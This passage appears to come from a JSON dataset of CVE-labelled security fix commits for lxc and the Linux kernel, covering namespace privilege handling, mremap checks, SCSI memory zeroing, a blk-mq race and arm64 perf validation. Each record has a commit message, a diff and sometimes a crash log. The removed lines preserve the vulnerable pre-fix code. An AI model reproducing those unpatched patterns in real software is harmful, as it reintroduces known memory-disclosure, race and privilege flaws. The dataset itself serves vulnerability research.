&suid);\n+\tif (ret < 0) {\n+\t\tusernic_error(\"Failed to retrieve real, effective, and saved \"\n+\t\t\t      \"user IDs: %s\\n\",\n+\t\t\t      strerror(errno));\n+\t\tgoto do_partial_cleanup;\n+\t}\n+\n+\tret = setns(fd, CLONE_NEWNET);\n+\tclose(fd);\n+\tfd = -1;\n+\tif (ret < 0) {\n+\t\tusernic_error(\"Failed to setns() to the network namespace of \"\n+\t\t\t      \"the container with PID %d: %s.\\n\",\n+\t\t\t      pid, strerror(errno));\n+\t\tgoto do_partial_cleanup;\n \t}\n \n-\tif (setns(fd, 0) < 0) {\n-\t\tfprintf(stderr, \"setns to container network namespace\\n\");\n-\t\tgoto out_err;\n+\tret = setresuid(ruid, ruid, 0);\n+\tif (ret < 0) {\n+\t\tusernic_error(\"Failed to drop privilege by setting effective \"\n+\t\t\t      \"user id and real user id to %d, and saved user \"\n+\t\t\t      \"ID to 0: %s.\\n\",\n+\t\t\t      ruid, strerror(errno));\n+\t\t\/\/ COMMENT(brauner): It's ok to jump to do_full_cleanup here\n+\t\t\/\/ since setresuid() will succeed when trying to set real,\n+\t\t\/\/ effective, and saved to values they currently have.\n+\t\tgoto do_full_cleanup;\n \t}\n-\tclose(fd); fd = -1;\n+\n \tif (!*newnamep) {\n \t\tgrab_newname = true;\n \t\t*newnamep = VETH_DEF_NAME;\n-\t\tif (!(ifindex = if_nametoindex(oldname))) {\n-\t\t\tfprintf(stderr, \"failed to get netdev index\\n\");\n-\t\t\tgoto out_err;\n+\n+\t\tifindex = if_nametoindex(oldname);\n+\t\tif (!ifindex) {\n+\t\t\tusernic_error(\"Failed to get netdev index: %s.\\n\", strerror(errno));\n+\t\t\tgoto do_full_cleanup;\n \t\t}\n \t}\n-\tif ((ret = lxc_netdev_rename_by_name(oldname, *newnamep)) < 0) {\n-\t\tfprintf(stderr, \"Error %d renaming netdev %s to %s in container\\n\", ret, oldname, *newnamep);\n-\t\tgoto out_err;\n+\n+\tret = lxc_netdev_rename_by_name(oldname, *newnamep);\n+\tif (ret < 0) {\n+\t\tusernic_error(\"Error %d renaming netdev %s to %s in container.\\n\", ret, oldname, *newnamep);\n+\t\tgoto do_full_cleanup;\n \t}\n+\n \tif (grab_newname) {\n-\t\tchar ifname[IFNAMSIZ], *namep = ifname;\n+\t\tchar ifname[IFNAMSIZ];\n+\t\tchar *namep = ifname;\n+\n \t\tif (!if_indextoname(ifindex, namep)) {\n-\t\t\tfprintf(stderr, \"Failed to get new netdev name\\n\");\n-\t\t\tgoto out_err;\n+\t\t\tusernic_error(\"Failed to get new netdev name: %s.\\n\", strerror(errno));\n+\t\t\tgoto do_full_cleanup;\n \t\t}\n+\n \t\t*newnamep = strdup(namep);\n \t\tif (!*newnamep)\n-\t\t\tgoto out_err;\n+\t\t\tgoto do_full_cleanup;\n \t}\n-\tif (setns(ofd, 0) < 0) {\n-\t\tfprintf(stderr, \"Error returning to original netns\\n\");\n-\t\tclose(ofd);\n-\t\treturn -1;\n+\n+\tfret = 0;\n+\n+do_full_cleanup:\n+\tret = setresuid(ruid, euid, suid);\n+\tif (ret < 0) {\n+\t\tusernic_error(\"Failed to restore privilege by setting effective \"\n+\t\t\t      \"user id to %d, real user id to %d, and saved user \"\n+\t\t\t      \"ID to %d: %s.\\n\",\n+\t\t\t      ruid, euid, suid, strerror(errno));\n+\t\tfret = -1;\n+\t\t\/\/ COMMENT(brauner): setns() should fail if setresuid() doesn't\n+\t\t\/\/ succeed but there's no harm in falling through; keeps the\n+\t\t\/\/ code cleaner.\n \t}\n-\tclose(ofd);\n \n-\treturn 0;\n+\tret = setns(ofd, CLONE_NEWNET);\n+\tif (ret < 0) {\n+\t\tusernic_error(\"Failed to setns() to original network namespace \"\n+\t\t\t      \"of PID %d: %s.\\n\",\n+\t\t\t      ofd, strerror(errno));\n+\t\tfret = -1;\n+\t}\n \n-out_err:\n-\tif (ofd >= 0)\n-\t\tclose(ofd);\n-\tif (setns(ofd, 0) < 0)\n-\t\tfprintf(stderr, \"Error returning to original network namespace\\n\");\n+do_partial_cleanup:\n \tif (fd >= 0)\n \t\tclose(fd);\n-\treturn -1;\n+\tclose(ofd);\n+\n+\treturn fret;\n }\n \n \/*\n","owner":"lxc","repo":"lxc","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"0ec62d290912bb4b989be7563851bc364ec73b56","commit_message":"From 0ec62d290912bb4b989be7563851bc364ec73b56 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Tue, 24 Nov 2009 08:53:51 -0500\nSubject: kill useless checks in sparc mremap variants\n\nAcked-by: David S. Miller <davem@davemloft.net>\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/sparc\/kernel\/sys_sparc32.c  | 22 ----------------------\n arch\/sparc\/kernel\/sys_sparc_32.c | 21 ---------------------\n arch\/sparc\/kernel\/sys_sparc_64.c |  6 ------\n arch\/sparc\/kernel\/systbls_32.S   |  2 +-\n arch\/sparc\/kernel\/systbls_64.S   |  2 +-\n 5 files changed, 2 insertions(+), 51 deletions(-)\n\n","diff_code":"diff --git a\/arch\/sparc\/kernel\/sys_sparc32.c b\/arch\/sparc\/kernel\/sys_sparc32.c\nindex 00abe87e5b51..dc0ac197e7e2 100644\n--- a\/arch\/sparc\/kernel\/sys_sparc32.c\n+++ b\/arch\/sparc\/kernel\/sys_sparc32.c\n@@ -564,28 +564,6 @@ asmlinkage long sparc32_open(const char __user *filename,\n \treturn do_sys_open(AT_FDCWD, filename, flags, mode);\n }\n \n-extern unsigned long do_mremap(unsigned long addr,\n-\tunsigned long old_len, unsigned long new_len,\n-\tunsigned long flags, unsigned long new_addr);\n-                \n-asmlinkage unsigned long sys32_mremap(unsigned long addr,\n-\tunsigned long old_len, unsigned long new_len,\n-\tunsigned long flags, u32 __new_addr)\n-{\n-\tunsigned long ret = -EINVAL;\n-\tunsigned long new_addr = __new_addr;\n-\n-\tif (unlikely(sparc_mmap_check(addr, old_len)))\n-\t\tgoto out;\n-\tif (unlikely(sparc_mmap_check(new_addr, new_len)))\n-\t\tgoto out;\n-\tdown_write(&current->mm->mmap_sem);\n-\tret = do_mremap(addr, old_len, new_len, flags, new_addr);\n-\tup_write(&current->mm->mmap_sem);\n-out:\n-\treturn ret;       \n-}\n-\n long sys32_lookup_dcookie(unsigned long cookie_high,\n \t\t\t  unsigned long cookie_low,\n \t\t\t  char __user *buf, size_t len)\ndiff --git a\/arch\/sparc\/kernel\/sys_sparc_32.c b\/arch\/sparc\/kernel\/sys_sparc_32.c\nindex 03035c852a43..10c43bea32c7 100644\n--- a\/arch\/sparc\/kernel\/sys_sparc_32.c\n+++ b\/arch\/sparc\/kernel\/sys_sparc_32.c\n@@ -287,27 +287,6 @@ long sparc_remap_file_pages(unsigned long start, unsigned long size,\n \t\t\t\t    (pgoff >> (PAGE_SHIFT - 12)), flags);\n }\n \n-extern unsigned long do_mremap(unsigned long addr,\n-\tunsigned long old_len, unsigned long new_len,\n-\tunsigned long flags, unsigned long new_addr);\n-                \n-asmlinkage unsigned long sparc_mremap(unsigned long addr,\n-\tunsigned long old_len, unsigned long new_len,\n-\tunsigned long flags, unsigned long new_addr)\n-{\n-\tunsigned long ret = -EINVAL;\n-\n-\tif (unlikely(sparc_mmap_check(addr, old_len)))\n-\t\tgoto out;\n-\tif (unlikely(sparc_mmap_check(new_addr, new_len)))\n-\t\tgoto out;\n-\tdown_write(&current->mm->mmap_sem);\n-\tret = do_mremap(addr, old_len, new_len, flags, new_addr);\n-\tup_write(&current->mm->mmap_sem);\n-out:\n-\treturn ret;       \n-}\n-\n \/* we come to here via sys_nis_syscall so it can setup the regs argument *\/\n asmlinkage unsigned long\n c_sys_nis_syscall (struct pt_regs *regs)\ndiff --git a\/arch\/sparc\/kernel\/sys_sparc_64.c b\/arch\/sparc\/kernel\/sys_sparc_64.c\nindex e2d102447a43..ddda12fcbac2 100644\n--- a\/arch\/sparc\/kernel\/sys_sparc_64.c\n+++ b\/arch\/sparc\/kernel\/sys_sparc_64.c\n@@ -614,12 +614,6 @@ SYSCALL_DEFINE5(64_mremap, unsigned long, addr,\tunsigned long, old_len,\n \n \tif (test_thread_flag(TIF_32BIT))\n \t\tgoto out;\n-\tif (unlikely(new_len >= VA_EXCLUDE_START))\n-\t\tgoto out;\n-\tif (unlikely(sparc_mmap_check(addr, old_len)))\n-\t\tgoto out;\n-\tif (unlikely(sparc_mmap_check(new_addr, new_len)))\n-\t\tgoto out;\n \n \tdown_write(&current->mm->mmap_sem);\n \tret = do_mremap(addr, old_len, new_len, flags, new_addr);\ndiff --git a\/arch\/sparc\/kernel\/systbls_32.S b\/arch\/sparc\/kernel\/systbls_32.S\nindex ceb1530f8aa6..3a66765ade58 100644\n--- a\/arch\/sparc\/kernel\/systbls_32.S\n+++ b\/arch\/sparc\/kernel\/systbls_32.S\n@@ -67,7 +67,7 @@ sys_call_table:\n \/*235*\/\t.long sys_fstatfs64, sys_llseek, sys_mlock, sys_munlock, sys_mlockall\n \/*240*\/\t.long sys_munlockall, sys_sched_setparam, sys_sched_getparam, sys_sched_setscheduler, sys_sched_getscheduler\n \/*245*\/\t.long sys_sched_yield, sys_sched_get_priority_max, sys_sched_get_priority_min, sys_sched_rr_get_interval, sys_nanosleep\n-\/*250*\/\t.long sparc_mremap, sys_sysctl, sys_getsid, sys_fdatasync, sys_nfsservctl\n+\/*250*\/\t.long sys_mremap, sys_sysctl, sys_getsid, sys_fdatasync, sys_nfsservctl\n \/*255*\/\t.long sys_sync_file_range, sys_clock_settime, sys_clock_gettime, sys_clock_getres, sys_clock_nanosleep\n \/*260*\/\t.long sys_sched_getaffinity, sys_sched_setaffinity, sys_timer_settime, sys_timer_gettime, sys_timer_getoverrun\n \/*265*\/\t.long sys_timer_delete, sys_timer_create, sys_nis_syscall, sys_io_setup, sys_io_destroy\ndiff --git a\/arch\/sparc\/kernel\/systbls_64.S b\/arch\/sparc\/kernel\/systbls_64.S\nindex cc8e7862e95a..0648a087810a 100644\n--- a\/arch\/sparc\/kernel\/systbls_64.S\n+++ b\/arch\/sparc\/kernel\/systbls_64.S\n@@ -68,7 +68,7 @@ sys_call_table32:\n \t.word compat_sys_fstatfs64, sys_llseek, sys_mlock, sys_munlock, sys32_mlockall\n \/*240*\/\t.word sys_munlockall, sys32_sched_setparam, sys32_sched_getparam, sys32_sched_setscheduler, sys32_sched_getscheduler\n \t.word sys_sched_yield, sys32_sched_get_priority_max, sys32_sched_get_priority_min, sys32_sched_rr_get_interval, compat_sys_nanosleep\n-\/*250*\/\t.word sys32_mremap, compat_sys_sysctl, sys32_getsid, sys_fdatasync, sys32_nfsservctl\n+\/*250*\/\t.word sys_mremap, compat_sys_sysctl, sys32_getsid, sys_fdatasync, sys32_nfsservctl\n \t.word sys32_sync_file_range, compat_sys_clock_settime, compat_sys_clock_gettime, compat_sys_clock_getres, sys32_clock_nanosleep\n \/*260*\/\t.word compat_sys_sched_getaffinity, compat_sys_sched_setaffinity, sys32_timer_settime, compat_sys_timer_gettime, sys_timer_getoverrun\n \t.word sys_timer_delete, compat_sys_timer_create, sys_ni_syscall, compat_sys_io_setup, sys_io_destroy\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-1000204","CWE_ID":"264","category":"security","commit_id":"a45b599ad808c3c982fdcdc12b0b8611c2f92824","commit_message":"From a45b599ad808c3c982fdcdc12b0b8611c2f92824 Mon Sep 17 00:00:00 2001\nFrom: Alexander Potapenko <glider@google.com>\nDate: Fri, 18 May 2018 16:23:18 +0200\nSubject: [PATCH] scsi: sg: allocate with __GFP_ZERO in sg_build_indirect()\n\nThis shall help avoid copying uninitialized memory to the userspace when\ncalling ioctl(fd, SG_IO) with an empty command.\n\nReported-by: syzbot+7d26fc1eea198488deab@syzkaller.appspotmail.com\nCc: stable@vger.kernel.org\nSigned-off-by: Alexander Potapenko <glider@google.com>\nAcked-by: Douglas Gilbert <dgilbert@interlog.com>\nReviewed-by: Johannes Thumshirn <jthumshirn@suse.de>\nSigned-off-by: Martin K. Petersen <martin.petersen@oracle.com>\n---\n drivers\/scsi\/sg.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/drivers\/scsi\/sg.c b\/drivers\/scsi\/sg.c\nindex c198b96368dd6..5c40d809830f8 100644\n--- a\/drivers\/scsi\/sg.c\n+++ b\/drivers\/scsi\/sg.c\n@@ -1894,7 +1894,7 @@ sg_build_indirect(Sg_scatter_hold * schp, Sg_fd * sfp, int buff_size)\n \t\tnum = (rem_sz > scatter_elem_sz_prev) ?\n \t\t\tscatter_elem_sz_prev : rem_sz;\n \n-\t\tschp->pages[k] = alloc_pages(gfp_mask, order);\n+\t\tschp->pages[k] = alloc_pages(gfp_mask | __GFP_ZERO, order);\n \t\tif (!schp->pages[k])\n \t\t\tgoto out;\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-9016","CWE_ID":"264","category":"security","commit_id":"0048b4837affd153897ed1222283492070027aa9","commit_message":"From 0048b4837affd153897ed1222283492070027aa9 Mon Sep 17 00:00:00 2001\nFrom: Ming Lei <ming.lei@canonical.com>\nDate: Sun, 9 Aug 2015 03:41:51 -0400\nSubject: [PATCH] blk-mq: fix race between timeout and freeing request\n\nInside timeout handler, blk_mq_tag_to_rq() is called\nto retrieve the request from one tag. This way is obviously\nwrong because the request can be freed any time and some\nfiedds of the request can't be trusted, then kernel oops\nmight be triggered[1].\n\nCurrently wrt. blk_mq_tag_to_rq(), the only special case is\nthat the flush request can share same tag with the request\ncloned from, and the two requests can't be active at the same\ntime, so this patch fixes the above issue by updating tags->rqs[tag]\nwith the active request(either flush rq or the request cloned\nfrom) of the tag.\n\nAlso blk_mq_tag_to_rq() gets much simplified with this patch.\n\nGiven blk_mq_tag_to_rq() is mainly for drivers and the caller must\nmake sure the request can't be freed, so in bt_for_each() this\nhelper is replaced with tags->rqs[tag].\n\n[1] kernel oops log\n[  439.696220] BUG: unable to handle kernel NULL pointer dereference at 0000000000000158^M\n[  439.697162] IP: [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21\/0x6e^M\n[  439.700653] PGD 7ef765067 PUD 7ef764067 PMD 0 ^M\n[  439.700653] Oops: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC ^M\n[  439.700653] Dumping ftrace buffer:^M\n[  439.700653]    (ftrace buffer empty)^M\n[  439.700653] Modules linked in: nbd ipv6 kvm_intel kvm serio_raw^M\n[  439.700653] CPU: 6 PID: 2779 Comm: stress-ng-sigfd Not tainted 4.2.0-rc5-next-20150805+ #265^M\n[  439.730500] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011^M\n[  439.730500] task: ffff880605308000 ti: ffff88060530c000 task.ti: ffff88060530c000^M\n[  439.730500] RIP: 0010:[<ffffffff812d89ba>]  [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21\/0x6e^M\n[  439.730500] RSP: 0018:ffff880819203da0  EFLAGS: 00010283^M\n[  439.730500] RAX: ffff880811b0e000 RBX: ffff8800bb465f00 RCX: 0000000000000002^M\n[  439.730500] RDX: 0000000000000000 RSI: 0000000000000202 RDI: 0000000000000000^M\n[  439.730500] RBP: ffff880819203db0 R08: 0000000000000002 R09: 0000000000000000^M\n[  439.730500] R10: 0000000000000000 R11: 0000000000000000 R12: 0000000000000202^M\n[  439.730500] R13: ffff880814104800 R14: 0000000000000002 R15: ffff880811a2ea00^M\n[  439.730500] FS:  00007f165b3f5740(0000) GS:ffff880819200000(0000) knlGS:0000000000000000^M\n[  439.730500] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b^M\n[  439.730500] CR2: 0000000000000158 CR3: 00000007ef766000 CR4: 00000000000006e0^M\n[  439.730500] Stack:^M\n[  439.730500]  0000000000000008 ffff8808114eed90 ffff880819203e00 ffffffff812dc104^M\n[  439.755663]  ffff880819203e40 ffffffff812d9f5e 0000020000000000 ffff8808114eed80^M\n[  439.755663] Call Trace:^M\n[  439.755663]  <IRQ> ^M\n[  439.755663]  [<ffffffff812dc104>] bt_for_each+0x6e\/0xc8^M\n[  439.755663]  [<ffffffff812d9f5e>] ? blk_mq_rq_timed_out+0x6a\/0x6a^M\n[  439.755663]  [<ffffffff812d9f5e>] ? blk_mq_rq_timed_out+0x6a\/0x6a^M\n[  439.755663]  [<ffffffff812dc1b3>] blk_mq_tag_busy_iter+0x55\/0x5e^M\n[  439.755663]  [<ffffffff812d88b4>] ? blk_mq_bio_to_request+0x38\/0x38^M\n[  439.755663]  [<ffffffff812d8911>] blk_mq_rq_timer+0x5d\/0xd4^M\n[  439.755663]  [<ffffffff810a3e10>] call_timer_fn+0xf7\/0x284^M\n[  439.755663]  [<ffffffff810a3d1e>] ? call_timer_fn+0x5\/0x284^M\n[  439.755663]  [<ffffffff812d88b4>] ? blk_mq_bio_to_request+0x38\/0x38^M\n[  439.755663]  [<ffffffff810a46d6>] run_timer_softirq+0x1ce\/0x1f8^M\n[  439.755663]  [<ffffffff8104c367>] __do_softirq+0x181\/0x3a4^M\n[  439.755663]  [<ffffffff8104c76e>] irq_exit+0x40\/0x94^M\n[  439.755663]  [<ffffffff81031482>] smp_apic_timer_interrupt+0x33\/0x3e^M\n[  439.755663]  [<ffffffff815559a4>] apic_timer_interrupt+0x84\/0x90^M\n[  439.755663]  <EOI> ^M\n[  439.755663]  [<ffffffff81554350>] ? _raw_spin_unlock_irq+0x32\/0x4a^M\n[  439.755663]  [<ffffffff8106a98b>] finish_task_switch+0xe0\/0x163^M\n[  439.755663]  [<ffffffff8106a94d>] ? finish_task_switch+0xa2\/0x163^M\n[  439.755663]  [<ffffffff81550066>] __schedule+0x469\/0x6cd^M\n[  439.755663]  [<ffffffff8155039b>] schedule+0x82\/0x9a^M\n[  439.789267]  [<ffffffff8119b28b>] signalfd_read+0x186\/0x49a^M\n[  439.790911]  [<ffffffff8106d86a>] ? wake_up_q+0x47\/0x47^M\n[  439.790911]  [<ffffffff811618c2>] __vfs_read+0x28\/0x9f^M\n[  439.790911]  [<ffffffff8117a289>] ? __fget_light+0x4d\/0x74^M\n[  439.790911]  [<ffffffff811620a7>] vfs_read+0x7a\/0xc6^M\n[  439.790911]  [<ffffffff8116292b>] SyS_read+0x49\/0x7f^M\n[  439.790911]  [<ffffffff81554c17>] entry_SYSCALL_64_fastpath+0x12\/0x6f^M\n[  439.790911] Code: 48 89 e5 e8 a9 b8 e7 ff 5d c3 0f 1f 44 00 00 55 89\nf2 48 89 e5 41 54 41 89 f4 53 48 8b 47 60 48 8b 1c d0 48 8b 7b 30 48 8b\n53 38 <48> 8b 87 58 01 00 00 48 85 c0 75 09 48 8b 97 88 0c 00 00 eb 10\n^M\n[  439.790911] RIP  [<ffffffff812d89ba>] blk_mq_tag_to_rq+0x21\/0x6e^M\n[  439.790911]  RSP <ffff880819203da0>^M\n[  439.790911] CR2: 0000000000000158^M\n[  439.790911] ---[ end trace d40af58949325661 ]---^M\n\nCc: <stable@vger.kernel.org>\nSigned-off-by: Ming Lei <ming.lei@canonical.com>\nSigned-off-by: Jens Axboe <axboe@fb.com>\n---\n block\/blk-flush.c  | 15 ++++++++++++++-\n block\/blk-mq-tag.c |  4 ++--\n block\/blk-mq-tag.h | 12 ++++++++++++\n block\/blk-mq.c     | 16 +---------------\n block\/blk.h        |  6 ++++++\n 5 files changed, 35 insertions(+), 18 deletions(-)\n\n","diff_code":"diff --git a\/block\/blk-flush.c b\/block\/blk-flush.c\nindex 20badd7b9d1b6..9c423e53324a2 100644\n--- a\/block\/blk-flush.c\n+++ b\/block\/blk-flush.c\n@@ -73,6 +73,7 @@\n \n #include \"blk.h\"\n #include \"blk-mq.h\"\n+#include \"blk-mq-tag.h\"\n \n \/* FLUSH\/FUA sequences *\/\n enum {\n@@ -226,7 +227,12 @@ static void flush_end_io(struct request *flush_rq, int error)\n \tstruct blk_flush_queue *fq = blk_get_flush_queue(q, flush_rq->mq_ctx);\n \n \tif (q->mq_ops) {\n+\t\tstruct blk_mq_hw_ctx *hctx;\n+\n+\t\t\/* release the tag's ownership to the req cloned from *\/\n \t\tspin_lock_irqsave(&fq->mq_flush_lock, flags);\n+\t\thctx = q->mq_ops->map_queue(q, flush_rq->mq_ctx->cpu);\n+\t\tblk_mq_tag_set_rq(hctx, flush_rq->tag, fq->orig_rq);\n \t\tflush_rq->tag = -1;\n \t}\n \n@@ -308,11 +314,18 @@ static bool blk_kick_flush(struct request_queue *q, struct blk_flush_queue *fq)\n \n \t\/*\n \t * Borrow tag from the first request since they can't\n-\t * be in flight at the same time.\n+\t * be in flight at the same time. And acquire the tag's\n+\t * ownership for flush req.\n \t *\/\n \tif (q->mq_ops) {\n+\t\tstruct blk_mq_hw_ctx *hctx;\n+\n \t\tflush_rq->mq_ctx = first_rq->mq_ctx;\n \t\tflush_rq->tag = first_rq->tag;\n+\t\tfq->orig_rq = first_rq;\n+\n+\t\thctx = q->mq_ops->map_queue(q, first_rq->mq_ctx->cpu);\n+\t\tblk_mq_tag_set_rq(hctx, first_rq->tag, flush_rq);\n \t}\n \n \tflush_rq->cmd_type = REQ_TYPE_FS;\ndiff --git a\/block\/blk-mq-tag.c b\/block\/blk-mq-tag.c\nindex 9b6e28830b823..9115c6d59948a 100644\n--- a\/block\/blk-mq-tag.c\n+++ b\/block\/blk-mq-tag.c\n@@ -429,7 +429,7 @@ static void bt_for_each(struct blk_mq_hw_ctx *hctx,\n \t\tfor (bit = find_first_bit(&bm->word, bm->depth);\n \t\t     bit < bm->depth;\n \t\t     bit = find_next_bit(&bm->word, bm->depth, bit + 1)) {\n-\t\t     \trq = blk_mq_tag_to_rq(hctx->tags, off + bit);\n+\t\t\trq = hctx->tags->rqs[off + bit];\n \t\t\tif (rq->q == hctx->queue)\n \t\t\t\tfn(hctx, rq, data, reserved);\n \t\t}\n@@ -453,7 +453,7 @@ static void bt_tags_for_each(struct blk_mq_tags *tags,\n \t\tfor (bit = find_first_bit(&bm->word, bm->depth);\n \t\t     bit < bm->depth;\n \t\t     bit = find_next_bit(&bm->word, bm->depth, bit + 1)) {\n-\t\t\trq = blk_mq_tag_to_rq(tags, off + bit);\n+\t\t\trq = tags->rqs[off + bit];\n \t\t\tfn(rq, data, reserved);\n \t\t}\n \ndiff --git a\/block\/blk-mq-tag.h b\/block\/blk-mq-tag.h\nindex 75893a34237d2..9eb2cf4f01cb8 100644\n--- a\/block\/blk-mq-tag.h\n+++ b\/block\/blk-mq-tag.h\n@@ -89,4 +89,16 @@ static inline void blk_mq_tag_idle(struct blk_mq_hw_ctx *hctx)\n \t__blk_mq_tag_idle(hctx);\n }\n \n+\/*\n+ * This helper should only be used for flush request to share tag\n+ * with the request cloned from, and both the two requests can't be\n+ * in flight at the same time. The caller has to make sure the tag\n+ * can't be freed.\n+ *\/\n+static inline void blk_mq_tag_set_rq(struct blk_mq_hw_ctx *hctx,\n+\t\tunsigned int tag, struct request *rq)\n+{\n+\thctx->tags->rqs[tag] = rq;\n+}\n+\n #endif\ndiff --git a\/block\/blk-mq.c b\/block\/blk-mq.c\nindex 81edbd95bda87..f2d67b4047a04 100644\n--- a\/block\/blk-mq.c\n+++ b\/block\/blk-mq.c\n@@ -559,23 +559,9 @@ void blk_mq_abort_requeue_list(struct request_queue *q)\n }\n EXPORT_SYMBOL(blk_mq_abort_requeue_list);\n \n-static inline bool is_flush_request(struct request *rq,\n-\t\tstruct blk_flush_queue *fq, unsigned int tag)\n-{\n-\treturn ((rq->cmd_flags & REQ_FLUSH_SEQ) &&\n-\t\t\tfq->flush_rq->tag == tag);\n-}\n-\n struct request *blk_mq_tag_to_rq(struct blk_mq_tags *tags, unsigned int tag)\n {\n-\tstruct request *rq = tags->rqs[tag];\n-\t\/* mq_ctx of flush rq is always cloned from the corresponding req *\/\n-\tstruct blk_flush_queue *fq = blk_get_flush_queue(rq->q, rq->mq_ctx);\n-\n-\tif (!is_flush_request(rq, fq, tag))\n-\t\treturn rq;\n-\n-\treturn fq->flush_rq;\n+\treturn tags->rqs[tag];\n }\n EXPORT_SYMBOL(blk_mq_tag_to_rq);\n \ndiff --git a\/block\/blk.h b\/block\/blk.h\nindex 026d9594142bd..838188b35a83f 100644\n--- a\/block\/blk.h\n+++ b\/block\/blk.h\n@@ -22,6 +22,12 @@ struct blk_flush_queue {\n \tstruct list_head\tflush_queue[2];\n \tstruct list_head\tflush_data_in_flight;\n \tstruct request\t\t*flush_rq;\n+\n+\t\/*\n+\t * flush_rq shares tag with this rq, both can't be active\n+\t * at the same time\n+\t *\/\n+\tstruct request\t\t*orig_rq;\n \tspinlock_t\t\tmq_flush_lock;\n };\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2015-8955","CWE_ID":"264","category":"security","commit_id":"8fff105e13041e49b82f92eef034f363a6b1c071","commit_message":"From 8fff105e13041e49b82f92eef034f363a6b1c071 Mon Sep 17 00:00:00 2001\nFrom: \"Suzuki K. Poulose\" <suzuki.poulose@arm.com>\nDate: Tue, 17 Mar 2015 18:14:59 +0000\nSubject: [PATCH] arm64: perf: reject groups spanning multiple HW PMUs\n\nThe perf core implicitly rejects events spanning multiple HW PMUs, as in\nthese cases the event->ctx will differ. However this validation is\nperformed after pmu::event_init() is called in perf_init_event(), and\nthus pmu::event_init() may be called with a group leader from a\ndifferent HW PMU.\n\nThe ARM64 PMU driver does not take this fact into account, and when\nvalidating groups assumes that it can call to_arm_pmu(event->pmu) for\nany HW event. When the event in question is from another HW PMU this is\nwrong, and results in dereferencing garbage.\n\nThis patch updates the ARM64 PMU driver to first test for and reject\nevents from other PMUs, moving the to_arm_pmu and related logic after\nthis test. Fixes a crash triggered by perf_fuzzer on Linux-4.0-rc2, with\na CCI PMU present:\n\nBad mode in Synchronous Abort handler detected, code 0x86000006 -- IABT (current EL)\nCPU: 0 PID: 1371 Comm: perf_fuzzer Not tainted 3.19.0+ #249\nHardware name: V2F-1XV7 Cortex-A53x2 SMM (DT)\ntask: ffffffc07c73a280 ti: ffffffc07b0a0000 task.ti: ffffffc07b0a0000\nPC is at 0x0\nLR is at validate_event+0x90\/0xa8\npc : [<0000000000000000>] lr : [<ffffffc000090228>] pstate: 00000145\nsp : ffffffc07b0a3ba0\n\n[<          (null)>]           (null)\n[<ffffffc0000907d8>] armpmu_event_init+0x174\/0x3cc\n[<ffffffc00015d870>] perf_try_init_event+0x34\/0x70\n[<ffffffc000164094>] perf_init_event+0xe0\/0x10c\n[<ffffffc000164348>] perf_event_alloc+0x288\/0x358\n[<ffffffc000164c5c>] SyS_perf_event_open+0x464\/0x98c\nCode: bad PC value\n\nAlso cleans up the code to use the arm_pmu only when we know\nthat we are dealing with an arm pmu event.\n\nCc: Will Deacon <will.deacon@arm.com>\nAcked-by: Mark Rutland <mark.rutland@arm.com>\nAcked-by: Peter Ziljstra (Intel) <peterz@infradead.org>\nSigned-off-by: Suzuki K. Poulose <suzuki.poulose@arm.com>\nSigned-off-by: Will Deacon <will.deacon@arm.com>\n---\n arch\/arm64\/kernel\/perf_event.c | 21 +++++++++++++++------\n 1 file changed, 15 insertions(+), 6 deletions(-)\n\n","diff_code":"diff --git a\/arch\/arm64\/kernel\/perf_event.c b\/arch\/arm64\/kernel\/perf_event.c\nindex 25a5308744b1c..68a74151fa6cf 100644\n--- a\/arch\/arm64\/kernel\/perf_event.c\n+++ b\/arch\/arm64\/kernel\/perf_event.c\n@@ -322,22 +322,31 @@ armpmu_add(struct perf_event *event, int flags)\n }\n \n static int\n-validate_event(struct pmu_hw_events *hw_events,\n-\t       struct perf_event *event)\n+validate_event(struct pmu *pmu, struct pmu_hw_events *hw_events,\n+\t\t\t\tstruct perf_event *event)\n {\n-\tstruct arm_pmu *armpmu = to_arm_pmu(event->pmu);\n+\tstruct arm_pmu *armpmu;\n \tstruct hw_perf_event fake_event = event->hw;\n \tstruct pmu *leader_pmu = event->group_leader->pmu;\n \n \tif (is_software_event(event))\n \t\treturn 1;\n \n+\t\/*\n+\t * Reject groups spanning multiple HW PMUs (e.g. CPU + CCI). The\n+\t * core perf code won't check that the pmu->ctx == leader->ctx\n+\t * until after pmu->event_init(event).\n+\t *\/\n+\tif (event->pmu != pmu)\n+\t\treturn 0;\n+\n \tif (event->pmu != leader_pmu || event->state < PERF_EVENT_STATE_OFF)\n \t\treturn 1;\n \n \tif (event->state == PERF_EVENT_STATE_OFF && !event->attr.enable_on_exec)\n \t\treturn 1;\n \n+\tarmpmu = to_arm_pmu(event->pmu);\n \treturn armpmu->get_event_idx(hw_events, &fake_event) >= 0;\n }\n \n@@ -355,15 +364,15 @@ validate_group(struct perf_event *event)\n \tmemset(fake_used_mask, 0, sizeof(fake_used_mask));\n \tfake_pmu.used_mask = fake_used_mask;\n \n-\tif (!validate_event(&fake_pmu, leader))\n+\tif (!validate_event(event->pmu, &fake_pmu, leader))\n \t\treturn -EINVAL;\n \n \tlist_for_each_entry(sibling, &leader->sibling_list, group_entry) {\n-\t\tif (!validate_event(&fake_pmu, sibling))\n+\t\tif (!validate_event(event->pmu, &fake_pmu, sibling))\n \t\t\treturn -EINVAL;\n \t}\n \n-\tif (!validate_event(&fake_pmu, event))\n+\tif (!validate_event(event->pmu, &fake_pmu, event))\n \t\treturn -EINVAL;\n \n \treturn 